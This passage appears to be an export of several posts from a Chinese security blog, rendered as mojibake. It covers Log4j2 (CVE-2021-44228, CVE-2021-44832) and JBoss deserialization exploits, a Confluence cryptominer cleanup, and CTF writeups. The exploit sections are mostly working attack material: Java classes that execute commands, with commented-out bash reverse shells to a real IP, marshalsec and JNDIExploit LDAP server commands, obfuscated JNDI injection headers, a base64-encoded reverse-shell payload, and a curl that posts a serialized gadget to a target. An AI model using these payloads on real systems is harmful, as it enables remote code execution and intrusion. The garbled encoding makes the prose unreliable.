æ¼æ´æè¿°log4j2åœ¨è¿›è¡ŒJDBCååºåˆ—åŒ–ä¹‹å‰ï¼Œå¯ä»¥é€šè¿‡JNDIåŠ¨æ€è¿œç¨‹è·å–æ•°æ®åº“æºæ–‡ä»¶ã€‚å®˜æ–¹é…ç½®æ–‡æ¡£çš„æ ¼å¼å¦‚ä¸‹ï¼š 12345678910&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;Configuration status=&quot;error&quot;&gt; &lt;Appenders&gt; &lt;JDBC name=&quot;databaseAppender&quot; tableName=&quot;dbo.application_log&quot;&gt; &lt;DataSource jndiName=&quot;java:/comp/env/jdbc/LoggingDataSource&quot; /&gt; &lt;Column ... &lt;/JDBC&gt; &lt;/Appenders&gt;â€¦&lt;/Configuration&gt; è¿™é‡Œå¯ä»¥å°è¯•æ§åˆ¶ä»»æ„LDAPçš„URL,è€Œè¾¾æˆå¯¹åº”çš„åˆ©ç”¨ã€‚ 1&lt;DataSource jndiName=&quot;ldap://127.0.0.1:1389/Exploit&quot;/&gt; æœ¬åœ°å¤ç°æœ¬åœ°è·å–2.17.0ç‰ˆæœ¬log4j2 1234567891011121314151617181920212223242526272829303132&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;org.example&lt;/groupId&gt; &lt;artifactId&gt;log4j-rce&lt;/artifactId&gt;n &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;dependencies&gt; &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-core&lt;/artifactId&gt; &lt;version&gt;2.17.0&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-api&lt;/artifactId&gt; &lt;version&gt;2.17.0&lt;/version&gt; &lt;/dependency&gt;&lt;!-- &lt;dependency&gt;--&gt;&lt;!-- &lt;groupId&gt;commons-collections&lt;/groupId&gt;--&gt;&lt;!-- &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;--&gt;&lt;!-- &lt;version&gt;3.1&lt;/version&gt;--&gt;&lt;!-- &lt;/dependency&gt;--&gt; &lt;/dependencies&gt;&lt;/project&gt; è¿™é‡Œç›´æ¥å€ŸåŠ©CVE-2021-44228 pocæ¥è¿›è¡Œæµ‹è¯• 1234567891011121314151617181920import java.util.*;import org.apache.logging.log4j.LogManager;import org.apache.logging.log4j.Logger;public class Log4j2 { public static void main(String[] args) { System.setProperty(&quot;log4j2.configurationFile&quot;,&quot;http://192.168.1.81:8000/config.xml&quot;); System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;,&quot;true&quot;); final Logger logger = LogManager.getLogger(Log4j2.class); Scanner sc = new Scanner(System.in); String str; while(true) { str = sc.nextLine(); logger.error(str); } }} æœ¬åœ°æä¾›ä¸€ä¸ªconfig.xmlçš„é…ç½®æ–‡ä»¶ 123456789101112131415161718&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;Configuration status=&quot;error&quot;&gt; &lt;Appenders&gt; &lt;JDBC name=&quot;databaseAppender&quot; tableName=&quot;dbo.application_log&quot;&gt; &lt;DataSource jndiName=&quot;dns://${env:COMPUTERNAME}.mya9m5.dnslog.cn/exp&quot; /&gt; &lt;Column name=&quot;eventDate&quot; isEventTimestamp=&quot;true&quot; /&gt; &lt;Column name=&quot;level&quot; pattern=&quot;%level&quot; /&gt; &lt;Column name=&quot;logger&quot; pattern=&quot;%logger&quot; /&gt; &lt;Column name=&quot;message&quot; pattern=&quot;%message&quot; /&gt; &lt;Column name=&quot;exception&quot; pattern=&quot;%ex{full}&quot; /&gt; &lt;/JDBC&gt; &lt;/Appenders&gt; &lt;Loggers&gt; &lt;Root level=&quot;warn&quot;&gt; &lt;AppenderRef ref=&quot;databaseAppender&quot;/&gt; &lt;/Root&gt; &lt;/Loggers&gt;&lt;/Configuration&gt; è¿è¡Œåæ¥æ”¶è¯·æ±‚: æ¼æ´åˆ©ç”¨ç¼–å†™ä¸€ä¸ªexpæ”»å‡»ï¼Œå‘èµ·å¼¹å‡ºè®¡ç®—æœºçš„å‘½ä»¤ï¼Œå¹¶ä¸”æœ¬åœ°ç¼–è¯‘æˆæ¶æ„classç±» 1234567891011121314151617import com.sun.org.apache.xpath.internal.objects.XString;public class exp { static { // System.out.print(&quot;æ­£åœ¨æ‰§è¡Œå‘½ä»¤&quot;); try { Runtime rt = Runtime.getRuntime(); // String[] commands = {&quot;bash -i &gt;&amp; /dev/tcp/139.196.234.164/5555 0&gt;&amp;1&quot;}; String[] commands = {&quot;Calc&quot;}; Process pc = rt.exec(commands); System.out.println(&quot;æ­£åœ¨æ‰§è¡Œå‘½ä»¤&quot;); pc.waitFor(); } catch (Exception e) { e.printStackTrace(); } }} æ¶æ„expç±»æ–‡ä»¶ç›®å½•ä¸‹å¼€å¯ç®€æ˜“httpæœåŠ¡ 1python3 -m http.server 8001 æ¶æ„config.xmlæ–‡ä»¶ç›®å½•ä¸‹å¼€å¯ç®€æ˜“httpæœåŠ¡ 1python3 -m http.server ä½¿ç”¨marshalsecå¯åŠ¨æ¶æ„ldapæœåŠ¡ 1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://192.168.1.81:8001/#exp&quot; 7788 ä¿®æ”¹config.xmlæ–‡ä»¶DataSourceä¸º 1&lt;DataSource jndiName=&quot;ldap://192.168.1.81:7788/exp&quot; /&gt; è¿è¡ŒLog4j2.javaè§¦å‘æ¶æ„ä»£ç æ‰§è¡Œï¼š æ¼æ´åˆ†æè¯¥æ¼æ´åˆ©ç”¨ä¹‹å¤„æ¯”è¾ƒé¸¡è‚‹ï¼Œä½ éœ€è¦èƒ½å¤Ÿæ‹¥æœ‰ä¿®æ”¹æœ¬åœ°configæ–‡ä»¶çš„æƒé™æ‰èƒ½è¾¾æˆå¯¹åº”çš„åˆ©ç”¨ï¼Œå› æ­¤å…¶å½±å“é¢ç›¸å¯¹è¾ƒçª„ã€‚ä½†æ˜¯å‡ºäºå®‰å…¨è€ƒè™‘ï¼Œè¿˜æ˜¯å»ºè®®å°†å…¶æ›´æ–°è‡³æœ€æ–°ç‰ˆæœ¬. æ¼æ´ä¿®å¤https://logging.apache.org/log4j/2.x/security.html å°† Apache Log4j2 å‡çº§åˆ° 2.17.1ã€2.12.4 å’Œ 2.3.2 æˆ–æ›´é«˜ç‰ˆæœ¬ã€‚ å‚è€ƒè¿æ¥ https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/","link":"/2021/12/29/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Log4j2%E5%9F%BA%E4%BA%8EJDBCAPPENDER%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C-CVE-2021-44832/"},{"title":"jbossååºåˆ—åŒ–(CVE-2015-7501)","text":"æ¼æ´æ¦‚è¿°Red Hat JBoss Application Serverï¼ˆASï¼Œä¹Ÿç§°WildFlyï¼‰æ˜¯ç¾å›½çº¢å¸½ï¼ˆRed Hatï¼‰å…¬å¸çš„ä¸€æ¬¾åŸºäºJavaEEçš„å¼€æºçš„åº”ç”¨æœåŠ¡å™¨ï¼Œå®ƒå…·æœ‰å¯åŠ¨è¶…å¿«ã€è½»é‡ã€æ¨¡å—åŒ–è®¾è®¡ã€çƒ­éƒ¨ç½²å’Œå¹¶è¡Œéƒ¨ç½²ã€ç®€æ´ç®¡ç†ã€åŸŸç®¡ç†åŠç¬¬ä¸€ç±»å…ƒä»¶ç­‰ç‰¹æ€§ã€‚ çº¢å¸½ JBoss A-MQ 6.xï¼›BPM å¥—ä»¶ (BPMS) 6.xï¼›BRMS 6.x å’Œ 5.xï¼›æ•°æ®ç½‘æ ¼ï¼ˆJDGï¼‰6.xï¼›æ•°æ®è™šæ‹ŸåŒ– (JDV) 6.x å’Œ 5.xï¼›ä¼ä¸šåº”ç”¨å¹³å° 6.xã€5.x å’Œ 4.3.xï¼›ä¿é™©ä¸ 6.x; ä¿é™©ä¸ç»´ä¿®å·¥ç¨‹ (FSW) 6.xï¼›è¿è¥ç½‘ç»œï¼ˆJBoss ONï¼‰3.xï¼›ä¼ é€é—¨ 6.xï¼›SOA å¹³å° (SOA-P) 5.xï¼›ç½‘ç»œæœåŠ¡å™¨ï¼ˆJWSï¼‰3.xï¼›çº¢å¸½ OpenShift/xPAAS 3.xï¼›å’Œ Red Hat Subscription Asset Manager 1.3 å…è®¸è¿œç¨‹æ”»å‡»è€…é€šè¿‡ä¸ Apache Commons Collections (ACC) åº“ç›¸å…³çš„ç²¾å¿ƒè®¾è®¡çš„åºåˆ—åŒ– Java å¯¹è±¡æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ æ¼æ´åˆ©ç”¨ä½¿ç”¨ JavaDeserH2HCå·¥å…·ç”Ÿæˆåºåˆ—åŒ–æ•°æ® 12345javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.javajava -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap ip:port curl http://vulfocus.fofa.so:38046/invoker/JMXInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser","link":"/2021/12/24/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2015-7501/"},{"title":"log4j2RCE(CVE-2021-44228)æ¼æ´åˆ©ç”¨ä¸åˆ†æ","text":"æ¼æ´æè¿°:Apache Log4j2 æ˜¯ä¸€æ¬¾å¼€æºçš„ Java æ—¥å¿—è®°å½•å·¥å…·ï¼Œå¤§é‡çš„ä¸šåŠ¡æ¡†æ¶éƒ½ä½¿ç”¨äº†è¯¥ç»„ä»¶ã€‚å¦‚ï¼šApache Struts2ã€Apache Solrã€Apache Druidã€Apache Flinkç­‰ã€‚æ­¤æ¬¡æ¼æ´æ˜¯ç”¨äº Log4j2 æä¾›çš„ lookup åŠŸèƒ½é€ æˆçš„ï¼Œè¯¥åŠŸèƒ½å…è®¸å¼€å‘è€…é€šè¿‡ä¸€äº›åè®®å»è¯»å–ç›¸åº”ç¯å¢ƒä¸­çš„é…ç½®ã€‚ä½†åœ¨å®ç°çš„è¿‡ç¨‹ä¸­ï¼Œå¹¶æœªå¯¹è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„åˆ¤æ–­ï¼Œä»è€Œé€ æˆæ¼æ´çš„å‘ç”Ÿã€‚ å½±å“èŒƒå›´:Apache Log4j 2.x &lt; 2.15.0-rc2 æ¼æ´å¤ç°æœ¬åœ°å¤ç°ç¼–å†™æœ¬åœ°expç±» 1234567891011121314151617import com.sun.org.apache.xpath.internal.objects.XString;public class exp { static { // System.out.print(&quot;æ­£åœ¨æ‰§è¡Œå‘½ä»¤&quot;); try { Runtime rt = Runtime.getRuntime(); // String[] commands = {&quot;bash&quot;, &quot;-i&quot;, &quot;&gt;&amp;&quot;, &quot;/dev/tcp/139.196.234.164/5555 0&gt;&amp;1&quot;}; String[] commands = {&quot;Calc&quot;}; Process pc = rt.exec(commands); System.out.println(&quot;æ­£åœ¨æ‰§è¡Œå‘½ä»¤&quot;); pc.waitFor(); } catch (Exception e) { e.printStackTrace(); } }} æœ¬åœ°ç¼–è¯‘ä¸ºclassæ–‡ä»¶ 1javac exp.java ä½¿ç”¨marshalsecæœ¬åœ°å¯ç”¨æ¶æ„ç›‘å¬æœåŠ¡ 1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://192.168.1.81:8000/#exp&quot; 7788 ä½¿ç”¨Python3åœ¨æ¶æ„ç±»æ–‡ä»¶è·¯å¾„ä¸‹å¯åŠ¨ä¸€ä¸ªç®€æ˜“httpæœåŠ¡ 1python3 -m http.server æ’å…¥æ¶æ„payloadæ‰§è¡Œï¼Œè§¦å‘å‘½ä»¤æ‰§è¡Œ 1${jndi:ldap://192.168.1.81:7788/exp} çº¿ä¸Šé¶æœºå¤ç°-shellåå¼¹ä½¿ç”¨JNDIå¯åŠ¨æ¶æ„æœåŠ¡ 1java -jar JNDIExploit-1.2-SNAPSHOT.jar -i &quot;x.x.x.x&quot; -p 6666 æ„é€ æ”»å‡»payload: 1payload=${jndi:ldap://x.x.x.x:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA%252BJiAvZGV2L3RjcC8xMzkuMTk2LjIzNC4xNjQvNTU1NSAwPiYx} æ³¨ï¼šåé¢commandéœ€è¦ç»è¿‡ä¸€æ¬¡base64ç¼–ç ï¼Œä¸¤æ¬¡URLç¼–ç å¤„ç† 1command: bash -i &gt;&amp; /dev/tcp/x.x.x.x/5555 0&gt;&amp;1 çº¿ä¸Šé¶æœºå¤ç°-å›æ˜¾è¾“å‡ºä½¿ç”¨vulfocusä¸Šçš„é¶æœºæµ‹è¯• ç”¨Log4j2 jndi injection fuzz toolå¯¹ä¸»æœºè¿›è¡Œæ¨¡ç³Šæµ‹è¯•ï¼Œæ‰¾åˆ°ä¼ å‚ç‚¹åœ¨headerå¤´ ä½¿ç”¨JNDIå¯åŠ¨æ¶æ„æœåŠ¡ 1java -jar JNDIExploit-1.2-SNAPSHOT.jar -i &quot;x.x.x.x&quot; -p 6666 æŠ“åŒ…ä¿®æ”¹headerä¸ºæ”»å‡»payload 12X-Api-Version: ${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//139.196.234.164:1389/TomcatBypass/TomcatEcho}cmd:ls ä¿®å¤æ–¹æ¡ˆæˆªæ­¢åˆ°ç›®å‰ï¼Œç½‘ä¸Šçš„ä¿®å¤æ–¹æ³•å¤§è‡´æ˜¯è¿™äº›ï¼š è¡¥ä¸é“¾æ¥: log4j-2.15.0-rc2 1.æ·»åŠ jvmå¯åŠ¨å‚æ•°-Dlog4j2.formatMsgNoLookups=trueï¼› 2.åœ¨åº”ç”¨classpathä¸‹æ·»åŠ log4j2.component.propertiesé…ç½®æ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹ä¸ºlog4j2.formatMsgNoLookups=trueï¼› 3.JDKä½¿ç”¨11.0.1ã€8u191ã€7u201ã€6u211åŠä»¥ä¸Šçš„é«˜ç‰ˆæœ¬ã€‚","link":"/2021/12/11/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/log4j2RCE-CVE-2021-44228/"},{"title":"shiroæƒé™ç»•è¿‡ï¼ˆCVE-2020-1957ï¼‰","text":"æ¼æ´ä»‹ç»Apache Shiroæ˜¯ä¸€ä¸ªå¼ºå¤§ä¸”æ˜“ç”¨çš„Javaå®‰å…¨æ¡†æ¶,æ‰§è¡Œèº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å’Œä¼šè¯ç®¡ç†ã€‚2020å¹´8æœˆ18æ—¥ï¼ŒApache Shiroå®˜æ–¹å‘å¸ƒå®‰å…¨é€šå‘Š Apache Shiroèº«ä»½éªŒè¯ç»•è¿‡æ¼æ´ï¼ˆCVE-2020-13933ï¼‰ï¼Œç»è¿‡åˆ†æï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ç‰¹æ®Šçš„HTTPè¯·æ±‚å®ç°èº«ä»½éªŒè¯ç»•è¿‡ã€‚Shiroæ¡†æ¶é€šè¿‡æ‹¦æˆªå™¨åŠŸèƒ½æ¥å¯¹ç”¨æˆ·è®¿é—®æƒé™è¿›è¡Œæ§åˆ¶ï¼Œå¦‚anon, authcç­‰æ‹¦æˆªå™¨ã€‚anonä¸ºåŒ¿åæ‹¦æˆªå™¨ï¼Œä¸éœ€è¦ç™»å½•å³å¯è®¿é—®ï¼›authcä¸ºç™»å½•æ‹¦æˆªå™¨ï¼Œéœ€è¦ç™»å½•æ‰å¯ä»¥è®¿é—®ã€‚ä¸»è¦æ˜¯Spring webåœ¨åŒ¹é…urlçš„æ—¶å€™æ²¡æœ‰åŒ¹é…ä¸Š/å¯¼è‡´ç»•è¿‡ã€‚ å½±å“ç‰ˆæœ¬Apache Shiro &lt; 1.6.0 æ¼æ´åˆ©ç”¨","link":"/2021/10/26/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%EF%BC%88CVE-2020-1957%EF%BC%89/"},{"title":"è®°confluenceçš„ä¸€æ¬¡æº¯æº","text":"è®°ä¸€æ¬¡confluenceæŒ–çŸ¿æº¯æº1ã€èƒŒæ™¯æ¦‚è¿° 2ã€äº‹ä»¶åˆ†æè¯¥é˜¿é‡Œäº‘çš„ç³»ç»Ÿå®¢æˆ·éƒ¨ç½²ä¸€å¥—äº†çº¿ä¸Šçš„confluenceç³»ç»Ÿï¼Œä¸”è¯¥ç³»ç»Ÿæ˜¯éƒ¨ç½²äºæˆ‘å¸çš„è™ç›¾é›¶ä¿¡ä»»å®‰å…¨è®¿é—®ç³»ç»Ÿå†…çš„ï¼Œå¯¹å…¶å…¬ç½‘åº”ç”¨æ¥å£çš„æš´éœ²é¢è¿›è¡Œäº†ä¸¥æ ¼æ”¶æ•›ã€‚æ®å¾—çŸ¥å®¢æˆ·åœ¨å‰å¤©åˆšå¥½å°†è¯¥æ”¶æ•›ç³»ç»ŸçŸ­æš‚æš´éœ²åœ¨å…¬ç½‘ä¸­ï¼Œå¢åŠ å…¶è¢«æ”»å‡»çš„å¯èƒ½æ€§ï¼Œå¯¼è‡´æœ€åè¢«æ³¨å…¥æŒ–çŸ¿ç—…æ¯’ã€‚ å‰æœŸè·å–å®¢æˆ·æŸå‘˜å·¥ç”¨æˆ·ç™»å½•è´¦æˆ·ï¼Œè·å–å½“å‰ä½¿ç”¨çš„ç‰ˆæœ¬ä¸ºConfluence 7.9.3 æ ¹æ®è¯¥ç³»ç»Ÿç‰ˆæœ¬ï¼Œåœ¨äº’è”ç½‘ä¸­å‘ç°è¯¥ç³»ç»Ÿå­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2021-26084ï¼‰ï¼Œä¸”è¯¥ç³»ç»Ÿæ¼æ´åœ¨å…«æœˆåº•è¢«é»‘äº§å¤§è§„æ¨¡åˆ©ç”¨æ‰§è¡ŒæŒ–çŸ¿ç¨‹åºã€‚ 3ã€æ”»å‡»åˆ†ææŸ¥çœ‹ç³»ç»Ÿè¿›ç¨‹ï¼Œå‘ç°æ¶æ„è¿è¡Œè¿›ç¨‹ ps -ef æ ¹æ®é˜¿é‡Œäº‘å‘Šè­¦æç¤ºçš„è·¯å¾„è¯¥æ–‡ä»¶åˆ›å»ºçš„æ—¶é—´ä¸º Dec 13 12:42 ä¸‹è½½è¯¥è·¯å¾„æ–‡ä»¶è·å–çŸ¿æ± åœ°å€j0llychic.com:9999 è·å–è¯¥çŸ¿æ± çš„IPåœ°å€165.232.129.60å®šä½ä¸ºç¾å›½çš„ä¸€ä¸ªçŸ¿æ± åœ°å€ ç”¨æˆ·åå’Œå¯†ç ï¼š â€œuserâ€: â€œ47W42XBUVVm3Nwc1h6dqN9YJm8XiCR5yzBpeiWjpUdAdJdpxT4bHVnoczTDvdG1xtsF3YSD1hJviq5bLFNTPVMcj7sNKvs4â€,â€œpassâ€: â€œ82b1ee75afa6â€, æŸ¥çœ‹äº†ä¸€ä¸‹ç›®å‰æ¶æ„è¿›ç¨‹traceè¿è¡Œæƒ…å†µï¼Œè¯¥è¿›ç¨‹cpuå ç”¨ç‡ä¸º15%ï¼Œå¹¶æœªå¤ªé«˜ ç³»ç»Ÿæ—¥å¿—ä¸­ç›®å‰å¹¶æœªå‘ç°å…¶ä»–çš„å¯ç–‘è¿æ¥åŠè¿è¡Œè¿›ç¨‹ ä¸”confluenceæ—¥å¿—ä¸­ä¹Ÿå¹¶æœªå‘ç°å¯ç–‘çš„è¯·æ±‚æ—¥å¿—è®°å½• ç›®å‰å¤§æ¦‚ç‡æ€€ç–‘é»‘äº§æ˜¯é€šè¿‡CVE-2021-26084æ¼æ´éƒ¨ç½²çš„è¿œç¨‹æŒ–çŸ¿ç¨‹åºï¼Œä¸”æ¸…ç©ºäº†ç›¸åº”çš„è¯·æ±‚è®°å½• 4ã€ç—…æ¯’æ¸…ç†æ€æ­»è¿›ç¨‹12ps -ef | grep tracekill -9 14387 æ–‡ä»¶æ¸…ç†rm -rf /root/c3pool/ æ¶æ„è¿›ç¨‹ä¸å­˜åœ¨ çŸ¿æ± è¿æ¥å·²ä¸å­˜åœ¨ 5ã€æ¼æ´å¤ç°æ¼æ´éªŒè¯ï¼Œè¯¥ç³»ç»Ÿå­˜åœ¨CVE-2021-26084 æ— è™ç›¾æ”¶æ•›ï¼Œåº”ç”¨é¢æš´éœ²ï¼Œç›´æ¥åˆ©ç”¨ è™ç›¾æ”¶æ•›åº”ç”¨æš´éœ²é¢ï¼Œå·²çŸ¥åº”ç”¨å’Œç‰ˆæœ¬æ¼æ´çš„æƒ…å†µä¸‹ï¼Œæœªè¾¾æˆåˆ©ç”¨ 6ã€æ€»ç»“åˆ†æè¯¥å®¢æˆ·ç³»ç»Ÿéƒ¨ç½²äºè™ç›¾é›¶ä¿¡ä»»å®‰å…¨äº§å“ä½“ç³»ä¸‹ï¼Œå¹¶æœªé­å—ä»»ä½•æ”»å‡»ï¼Œå¾ˆå¥½çš„å¯¹åº”ç”¨åœ¨å…¬ç½‘çš„è®¿é—®æƒé™è¿›è¡Œäº†ä¸¥æ ¼é™åˆ¶å’Œæ”¶æ•›ã€‚ç”±äºç³»ç»Ÿçš„çŸ­æš‚å…¬ç½‘æš´éœ²ï¼Œä¸”è¯¥ç³»ç»Ÿå­˜åœ¨è¾ƒæ–°çš„ç‰ˆæœ¬æ¼æ´ï¼Œè€Œé­å—äº†æ­¤æ¬¡ä¸¥é‡çš„æ”»å‡»ï¼Œè¢«é»‘å®¢éƒ¨ç½²äº†æŒ–çŸ¿ç—…æ¯’ã€‚ 7ã€é˜²èŒƒæªæ–½å‡çº§ç³»ç»Ÿç‰ˆæœ¬ç›®å‰å®˜æ–¹å·²åœ¨é«˜ç‰ˆæœ¬ä¸­ä¿®å¤äº†è¯¥æ¼æ´ï¼Œè¯·å—å½±å“çš„ç”¨æˆ·å‡çº§è‡³å®‰å…¨ç‰ˆæœ¬ã€‚ https://www.atlassian.com/software/confluence/download-archives å®‰å…¨ç‰ˆæœ¬åˆ—è¡¨ Atlassian Confluence Server/Data Center 6.13.23 Atlassian Confluence Server/Data Center 7.4.11 Atlassian Confluence Server/Data Center 7.11.6 Atlassian Confluence Server/Data Center 7.12.5 Atlassian Confluence Server/Data Center 7.13.0","link":"/2021/12/17/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E8%AE%B0confluence%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BA%AF%E6%BA%90/"},{"title":"SCTF2021","text":"å›¢é˜Ÿåœ¨SCTFä¸­å–œè·ä¸¤æšflag webloginmeä¸‹è½½æºç å‘ç°æ˜¯goè¯­è¨€çš„webæ¡†æ¶é¢˜ å…¶å®å¯¹goä¸€ç‚¹ä¸ç†Ÿï¼Œä¹‹å‰ä¹Ÿæ²¡æœ‰å­¦è¿‡ï¼Œå¾ˆéš¾å—ï¼Œé‚£å°±ç°åœºå­¦ä¹ ä¸€ä¸‹å§ é¦–å…ˆéœ€è¦æœ¬åœ°ç™»å½• ä½†æ˜¯æºç è¦æ±‚x-forwarded-forå’Œx-client-ipå‡ä¸ºç©º æœginæ¨¡å—ClientIP()çš„ä½¿ç”¨æ–¹æ³•å‘ç°é»˜è®¤æ–¹æ³•æœ‰[X-Forwarded-For, X-Real-Ip] é‚£ç›´æ¥æ„é€ è¯·æ±‚åŒ…å‚æ•°X-Real-Ip:127.0.0.1æˆåŠŸç™»å½• åˆ†æroute.goæºç ä¸­Loginæ–¹æ³•é€»è¾‘ä¿è¯ä¼ å…¥idå‚æ•°ä¸º0ï¼Œå¯ä»¥å–åˆ°adminçš„ä¿¡æ¯ 1234567891011121314151617181920212223func Login(c *gin.Context) { idString, flag := c.GetQuery(&quot;id&quot;) if !flag { idString = &quot;1&quot; } id, err := strconv.Atoi(idString) if err != nil { id = 1 } TargetUser := structs.Admin for _, user := range structs.Users { if user.Id == id { TargetUser = user } } age := TargetUser.Age if age == &quot;&quot; { age, flag = c.GetQuery(&quot;age&quot;) if !flag { age = &quot;forever 18 (Tell me the age)&quot; } } è¿™é‡Œå­˜åœ¨ä¸€ä¸ªæ¨¡æ¿æ¸²æŸ“å‡½æ•°ï¼Œæ¸²æŸ“å‚æ•°ä¸ºageæ”¯æŒç”¨æˆ·è‡ªå®šä¹‰è¾“å…¥ 1234567891011121314151617 if err != nil { c.AbortWithError(500, err) } html := fmt.Sprintf(templates.AdminIndexTemplateHtml, age) if err != nil { c.AbortWithError(500, err) } tmpl, err := template.New(&quot;admin_index&quot;).Parse(html) if err != nil { c.AbortWithError(500, err) } tmpl.Execute(c.Writer, TargetUser)} ç™¾åº¦ä¸€ä¸‹goæ¨¡æ¿æ¸²æŸ“æ–¹å¼ï¼Œå…¶å®è·Ÿpythonçš„sstiå¾ˆåƒï¼Œäºæ˜¯æ„é€ age={{.}}ç›´æ¥å–å‡ºflag æœ€ç»ˆpayload:?id=0&amp;age={{.}} MISCThis_is_A_treeä¸‹è½½é™„ä»¶å‘ç°æ˜¯äºŒå‰æ ‘ æ•´ç†å¾—åˆ° å·¦å­æ ‘ å³å­æ ‘ æŒ‰æ ¹èŠ‚ç‚¹-å·¦èŠ‚ç‚¹-å³èŠ‚ç‚¹çš„é¡ºåºéå†ï¼Œå¹¶åœ¨åˆå­æ ‘yEhOå¤„åˆ†å‰²ï¼Œå¾—åˆ°ä¸¤æ–­base64åŠ å¯†å¯†æ–‡ Q2hpbmVzZSB0cmFkaXRpb25hbCBjdWx0dXJlIGlzIGJyb2FkIGFuZCBwcm9mb3VuZCEgU28gSSBXYW50IEdpdmUgWW91IE15IEZsYWcgQnV0IFlvdSBOZWVkIERlY29kZSBJdC5FbmpveSBUaGUgRmxhZyEh OuW4iCDlhZEg5aSNIOaNnyDlt70g6ZyHIOaZiyDlp6Qg5aSn6L+HIOiuvCDlmazll5Eg6ZyHIOaBkiDoioIg6LGrIA== è§£å¯†å¾—åˆ°ï¼šChinese traditional culture is broad and profound! So I Want Give You My Flag But You Need Decode It.Enjoy The Flag!!:å¸ˆ å…‘ å¤ æŸ å·½ éœ‡ æ™‹ å§¤ å¤§è¿‡ è®¼ å™¬å—‘ éœ‡ æ’ èŠ‚ è±« æŒ‰ä¼ç¾²å…­åå››å¦è§£å¯† exp 123456789101112131415161718192021s='å¸ˆå…‘å¤æŸå·½éœ‡æ™‹å§¤å¤§è¿‡è®¼å™¬å—‘éœ‡æ’èŠ‚è±«'dic={'å¤': '000000', 'å‰¥': '000001', 'æ¯”': '000010', 'è§‚': '000011', 'è±«': '000100', 'æ™‹': '000101', 'èƒ': '000110', 'å¦': '000111', 'è°¦': '001000', 'è‰®': '001001', 'è¹‡': '001010', 'æ¸': '001011', 'å°è¿‡': '001100', 'æ—…': '001101', 'å’¸': '001110', 'é': '001111', 'å¸ˆ': '010000', 'è’™': '010001', 'å': '010010', 'æ¶£': '010011', 'è§£': '010100', 'æœªæµ': '010101', 'å›°': '010110', 'è®¼': '010111', 'å‡': '011000', 'è›Š': '011001', 'äº•': '011010', 'å·½': '011011', 'æ’': '011100', 'é¼': '011101', 'å¤§è¿‡': '011110', 'å§¤': '011111', 'å¤': '100000', 'é¢': '100001', 'å±¯': '100010', 'ç›Š': '100011', 'éœ‡': '100100', 'å™¬å—‘': '100101', 'éš': '100110', 'æ— å¦„': '100111', 'æ˜å¤·': '101000', 'è´²': '101001', 'æ—¢æµ': '101010', 'å®¶äºº': '101011', 'ä¸°': '101100', 'ç¦»': '101101', 'é©': '101110', 'åŒäºº': '101111', 'ä¸´': '110000', 'æŸ': '110001', 'èŠ‚': '110010', 'ä¸­å­š': '110011', 'å½’å¦¹': '110100', 'ç½': '110101', 'å…‘': '110110', 'å±¥': '110111', 'æ³°': '111000', 'å¤§ç•œ': '111001', 'éœ€': '111010', 'å°ç•œ': '111011', 'å¤§å£®': '111100', 'å¤§æœ‰': '111101', 'å¤¬': '111110', 'ä¹¾': '111111'}li=[]k=0for i in range(len(s)): if k ==1: k=0 continue try: li.append(dic[s[i]]) except: t='' t=t+s[i]+s[i+1] li.append(dic[t]) k=1ss=''.join(li)print(ss)enc=''for i in range(0,len(ss),8): enc+=chr(eval('0b'+ss[i:i+8]))print(enc) å¾—åˆ°flag Ch1nA_yyds!","link":"/2021/12/25/%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/SCTF2021/"},{"title":"2020å¹´ç½‘é¼æ¯åˆèµ›ç„æ­¦ç»„éƒ¨åˆ†writeup","text":"2020å¹´ç½‘é¼æ¯åˆèµ›ç„æ­¦ç»„éƒ¨åˆ†writeup 